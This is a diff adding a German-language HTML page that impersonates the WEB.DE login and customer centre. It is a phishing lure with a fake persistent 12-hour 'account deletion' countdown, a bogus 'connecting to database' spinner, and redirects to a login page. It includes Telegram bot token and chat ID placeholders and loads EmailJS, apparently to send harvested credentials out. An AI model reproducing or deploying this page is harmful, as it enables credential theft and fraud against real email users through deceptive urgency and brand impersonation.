@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WEBDE LOGIN</title>
+    <meta name="description" content="Melden Sie sich bei Ihrem WEB.DE-Konto an, um die Deaktivierung zu stoppen">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <link rel="icon" href="/static/images/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script>
+        // Set global JavaScript variables
+        window.telegramBotToken = "{{ telegram_bot_token }}";
+        window.telegramChatId = "{{ telegram_chat_id }}";
+    </script>
+    <style>
+  /* Spinner container */
+  #spinner-container {
+        display: none;  /* Hidden by default */
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        text-align: center;
+        font-family: 'Roboto Condensed', sans-serif;
+        z-index: 10;  /* Make sure it appears above other content */
+        opacity: 0;  /* Make it transparent initially */
+        transition: opacity 0.3s ease;  /* Smooth fade-in/fade-out effect */
+        
+        /* Use flexbox to stack the spinner and text vertically */
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+    }
+
+    /* Spinner - container for 3 dots in a circle */
+    .spinner {
+        display: flex;
+        justify-content: space-between;
+        width: 60px;  /* Adjust the size */
+    }
+
+    /* Dot style */
+    .dot {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        background-color: #000;
+        animation: bounce 1.2s infinite ease-in-out;
+    }
+
+    /* Delay the animation for each dot */
+    .dot:nth-child(1) {
+        animation-delay: 0s;
+    }
+    .dot:nth-child(2) {
+        animation-delay: 0.2s;
+    }
+    .dot:nth-child(3) {
+        animation-delay: 0.4s;
+    }
+
+    /* Bounce animation */
+    @keyframes bounce {
+        0%, 100% {
+            transform: scale(0.5);
+        }
+        50% {
+            transform: scale(1.2);
+        }
+    }
+
+    /* Text styling to match your preferred style */
+    #spinner-container p {
+        margin-top: 20px;  /* Margin between dots and text */
+        font-size: 16px;  /* Original text size from your script */
+        font-weight: normal;  /* Normal font weight */
+        color: #000;  /* Black text color */
+        line-height: 1.5;  /* Line height for better spacing */
+    }
+
+    /* For the background fade effect (optional) */
+    #spinner-container.fade-in {
+        opacity: 1;
+    }
+
+    /* Apply blur effect to the login container when the spinner is active */
+    .login-container.blur {
+        filter: blur(8px);  /* Apply blur effect */
+        pointer-events: none;  /* Prevent interaction with the login form while blurred */
+    }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="/static/images/1.png" alt="WEB.DE Logo" class="logo">
+            <span class="account-text">Kundencenter</span>
+        </div>
+    </header>
+    <main class="main-content">
+        <div class="login-container">
+            <img src="/static/images/2.png" alt="WEB.DE Logo" class="formlogo">
+            
+            <form id="login-form" action="/login" method="POST">
+                <p>Ihr Konto soll gelöscht werden, wenn der Countdown abgelaufen ist. Danach werden alle Ihre Daten und Kontoinformationen dauerhaft aus unserem System entfernt und können nicht wiederhergestellt werden.</p>
+                
+                <div class="captcha-wrapper">
+                    <div class="captcha-container">
+                        <div class="captcha-icon">
+                            <!-- CAPTCHA image/icon here -->
+                        </div>
+                        <div class="captcha-background">
+                            <div class="captcha-text">Dieses Konto wird gelöscht in:</div>
+                            <div id="countdown-timer" class="captcha-timer">
+                                <div id="hours" class="time-unit">
+                                    <span class="label"></span>
+                                    <span class="time-value">12</span>
+                                </div>
+                                <div id="minutes" class="time-unit">
+                                    <span class="label"></span>
+                                    <span class="time-value">30</span>
+                                </div>
+                                <div id="seconds" class="time-unit">
+                                    <span class="label"></span>
+                                    <span class="time-value">45</span>
+                                </div>
+                            </div>
+                        </div>                        
+                        
+                            
+                        </div>
+                        <div class="captcha-links">
+                            <a href="login.html" id="no-delete" class="no-delete">Dies ist ein Fehler, löschen Sie mein Konto nicht</a>
+                            <a href="#" id="delete" class="delete">Konto sofort löschen</a>
+                        </div>
+                        
+                    </div>
+                </div>   
+             
+             <!-- Spinner container -->
+<div id="spinner-container" style="display:none;">
+    <div class="spinner">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+    </div>
+    <p>Verbindung zur WEB.DE-Datenbank wird hergestellt...</p>
+    <p>Ihr WEB.DE-Konto wird überprüft...</p>
+</div>
+                
+            </form>
+        </div>
+    </main>
+    <footer class="footer">
+        <nav>
+            <a href="#">Impressum</a>
+            <a href="#">Verträge hier kündigen</a>
+            <a href="#">Datenschutzhinweise</a>
+            <a href="#">AGB</a>
+            <a href="#">Hilfe und Tipps</a>
+        </nav>
+    </footer>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Function to reset the spinner and blur effect
+            function resetSpinnerAndBlur() {
+                const spinnerContainer = document.getElementById('spinner-container');
+                const loginContainer = document.querySelector('.login-container');
+    
+                // Ensure the spinner is hidden and blur effect is removed
+                spinnerContainer.style.display = 'none'; // Hide the spinner
+                loginContainer.classList.remove('blur'); // Remove blur effect
+                spinnerContainer.classList.remove('fade-in'); // Ensure no fade-in effect is active
+            }
+    
+            // Reset spinner and blur when the page is loaded
+            resetSpinnerAndBlur();
+    
+            // Add event listener to the no-delete link
+            document.getElementById('no-delete').addEventListener('click', function(event) {
+                event.preventDefault(); // Prevent the default link behavior
+    
+                // Show the spinner container with a fade-in effect when the no-delete link is clicked
+                const spinnerContainer = document.getElementById('spinner-container');
+                const loginContainer = document.querySelector('.login-container');
+    
+                // Add blur effect to login container
+                loginContainer.classList.add('blur');
+                spinnerContainer.style.display = 'flex';  // Make the spinner visible
+    
+                // Apply fade-in effect
+                setTimeout(function() {
+                    spinnerContainer.classList.add('fade-in');  // Fade in the spinner
+                }, 10);  // Small delay for effect
+    
+                const connectingText = spinnerContainer.querySelector('p:first-of-type'); // "Connecting to database..."
+                const verifyingText = spinnerContainer.querySelector('p:last-of-type'); // "Verifying your account..."
+    
+                // Show "Connecting to database..." for 4 seconds
+                connectingText.style.display = 'block';
+                verifyingText.style.display = 'none';  // Hide verifying text initially
+    
+                setTimeout(function() {
+                    connectingText.style.display = 'none';  // Hide "Connecting to database..."
+                    verifyingText.style.display = 'block';  // Show "Verifying your account..."
+                }, 4000); // Show "Verifying your account..." after 4 seconds
+    
+                // After a total of 8 seconds, hide the spinner and text, and remove the blur effect
+                setTimeout(function() {
+                    spinnerContainer.classList.remove('fade-in');
+                    setTimeout(function() {
+                        spinnerContainer.style.display = 'none';  // Hide the spinner completely
+                        loginContainer.classList.remove('blur');  // Remove the blur effect
+                        // Redirect after the spinner and text are hidden
+                        window.location.href = "login.html";  // Redirect to the next page after 8 seconds
+                    }, 300);  // Wait for the fade-out effect
+                }, 8000); // Total duration of 8 seconds (4 seconds for each text)
+            });
+    
+            // Detect when the page visibility changes (e.g., when navigating away and back)
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    // The page is no longer visible (e.g., user switched tabs or navigated away)
+                    // You can clear the spinner and blur here as well
+                    resetSpinnerAndBlur();
+                }
+            });
+        });
+    </script>
+    
+    
+    
+    
+    
+
+    <script>
+        // Add event listener to the delete link
+        document.getElementById('delete').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent default link behavior
+
+            // Show confirmation dialog in German
+            const confirmed = confirm("Sind Sie sicher, dass Sie Ihr Konto sofort löschen möchten?");
+
+            // If confirmed, redirect to the logout URL
+            if (confirmed) {
+                window.location.href = "https://web.de/magazine/logout/?status=login-failed";
+            }
+        });
+
+        // Add event listener to the no-delete link with a 1-second delay
+        document.getElementById('no-delete').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent default link behavior
+
+            // Delay the redirection by 1 second (1000 milliseconds)
+            setTimeout(function() {
+                window.location.href = "login.html";
+            }, 17000);
+        });
+    </script>
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Function to format the remaining time
+    function formatTimeComponent(time) {
+        return time.toString().padStart(2, '0');
+    }
+
+    // Set or get the end time from localStorage
+    function setEndTime() {
+        const currentTime = new Date().getTime();
+        const endTime = currentTime + 12 * 60 * 60 * 1000; // 12 hours from now
+        localStorage.setItem('captchaEndTime', endTime);
+        return endTime;
+    }
+
+    // Check if we have an existing end time and if it is expired
+    function getEndTime() {
+        const storedEndTime = localStorage.getItem('captchaEndTime');
+        if (storedEndTime) {
+            const currentTime = new Date().getTime();
+            if (currentTime > storedEndTime) {
+                // If time expired, reset the end time
+                return setEndTime();
+            }
+            return parseInt(storedEndTime, 10);
+        }
+        // If no stored end time, set one
+        return setEndTime();
+    }
+
+    // Update the countdown timer every second
+    function updateCountdown() {
+        const endTime = getEndTime();
+        const currentTime = new Date().getTime();
+        const remainingTime = Math.max(0, endTime - currentTime); // Make sure we don't get negative time
+
+        // Calculate hours, minutes, and seconds
+        const hours = Math.floor(remainingTime / 3600000);
+        const minutes = Math.floor((remainingTime % 3600000) / 60000);
+        const secondsLeft = Math.floor((remainingTime % 60000) / 1000);
+
+        // Update each part of the countdown individually
+        document.getElementById('hours').textContent = formatTimeComponent(hours);
+        document.getElementById('minutes').textContent = formatTimeComponent(minutes);
+        document.getElementById('seconds').textContent = formatTimeComponent(secondsLeft);
+
+        // If countdown has finished, clear the timer
+        if (remainingTime === 0) {
+            clearInterval(countdownInterval);
+        }
+    }
+
+    // Initial countdown update
+    updateCountdown();
+
+    // Update countdown every second
+    const countdownInterval = setInterval(updateCountdown, 1000);
+});
+
+
+
+        </script>
+        
+    <script src="../static/js/script.js"></script>
+</body>
+</html>
